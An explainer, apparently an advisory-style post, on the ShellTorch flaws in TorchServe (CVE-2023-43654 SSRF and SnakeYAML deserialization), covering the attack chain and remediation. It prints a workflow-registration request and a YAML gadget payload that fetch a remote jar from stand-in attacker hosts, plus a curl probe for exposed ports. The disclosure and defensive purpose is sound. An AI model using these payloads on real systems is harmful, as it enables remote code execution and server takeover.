**Shelltorch** is a collection of critical vulnerabilities in **TorchServe**, the model-serving library for PyTorch. First disclosed in 2023 by the Oligo Research Team, these flaws (specifically **CVE-2023-43654** and **CVE-2022-1471**) allow for unauthenticated **Remote Code Execution (RCE)**.

Given the massive adoption of PyTorch by the Fortune 500 and AI researchers, Shelltorch represents a "triple threat": it targets the infrastructure, the supply chain, and the AI models themselves.

---

### 🛠️ Technical Walkthrough of the Exploit

#### **Step 1: The Open Door (Misconfiguration)**

TorchServe documentation claimed that the **Management API** (Port 8081) only listened on `127.0.0.1` (localhost). In reality, the default configuration bound the service to `0.0.0.0`. This meant thousands of instances were exposed to the public internet without any authentication requirement.

#### **Step 2: The Delivery Vehicle (SSRF - CVE-2023-43654)**

Once an attacker reaches the Management API, they can call `/RegisterModel`. While this is meant to load valid AI models, TorchServe allowed a `url` parameter. Because there was no "allow-list" by default, the server could be tricked into downloading a **Malicious Workflow Archive (.war)** from an attacker-controlled server.

#### **Step 3: The Payload (Insecure Deserialization - CVE-2022-1471)**

Workflow configurations in TorchServe are defined in **YAML**. TorchServe used the `SnakeYAML` library with an unsafe constructor:
`new Yaml(new Constructor(Class.class)).load(yamlContent);`

By crafting a YAML file containing a specific Java gadget (like `ScriptEngineManager`), the attacker triggers the server to execute Java code the moment it attempts to "parse" the model's configuration.

---

### 🚀 Attack Flow Diagram

The following sequence illustrates how an external attacker moves from discovery to full shell access:

1. **Scanner:** Attacker finds an exposed Port 8081.
2. **Registration:** Attacker sends a POST request to `/workflows?url=http://attacker.com/evil.war`.
3. **Fetch:** TorchServe fetches the `.war` file.
4. **Parse:** The server uses the vulnerable `SnakeYAML` to read the `spec.yaml` inside the archive.
5. **Execute:** The Java gadget inside the YAML triggers a reverse shell or downloads a malicious `.jar` file.

---

### 📊 Who is Affected?

At the time of discovery, the research team found over **20,000 exposed instances** via Censys/Shodan. The vulnerability was not just in standalone TorchServe, but also embedded in major cloud AI environments.

* **Cloud Providers:** Amazon SageMaker, Google Vertex AI (Deep Learning Containers).
* **OSS Projects:** Kubeflow, KServe, MLflow.
* **Hardware Toolkits:** AWS Neuron.

#### **Vulnerability Matrix**

| Environment | Default Status | Risk Level |
| --- | --- | --- |
| **TorchServe Docker (< 0.8.1)** | Exposed to 0.0.0.0 | 🔴 Critical |
| **Standard PyPI Install** | Exposed to 0.0.0.0 | 🔴 Critical |
| **SageMaker / Vertex AI** | Varies by DLC version | 🟡 Medium (Managed) |

---

### 🧪 Demonstration & Detection

You can verify if a specific endpoint is vulnerable to the SSRF/Management exposure by checking the response of the Management port:

```bash
# A 405 Method Not Allowed response on Port 8081 often indicates an exposed TorchServe instance
curl -I http://<target-ip>:8081/models

```

**Malicious YAML Snippet:**
A simplified version of the payload used to trigger the RCE:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker-server.com/exploit.jar"]
  ]]
]

```

---

### 🛡️ Key Takeaways & Remediation

PyTorch and the TorchServe maintainers (Meta and Amazon) have since released patches. If you are running TorchServe, follow these steps immediately:

1. **Update TorchServe:** Ensure you are on version **0.8.2 or higher**.
2. **Bind to Localhost:** Explicitly set `management_address=http://127.0.0.1:8081` in your `config.properties`.
3. **Enable Authentication:** Implement token-based authentication for the management port.
4. **Use Allowed URLs:** Define an `allowed_urls` regex in your configuration to prevent the server from fetching models from untrusted domains.
5. **Network Segmentation:** Use a firewall or Security Group to ensure Port 8081 is never accessible from the public internet.
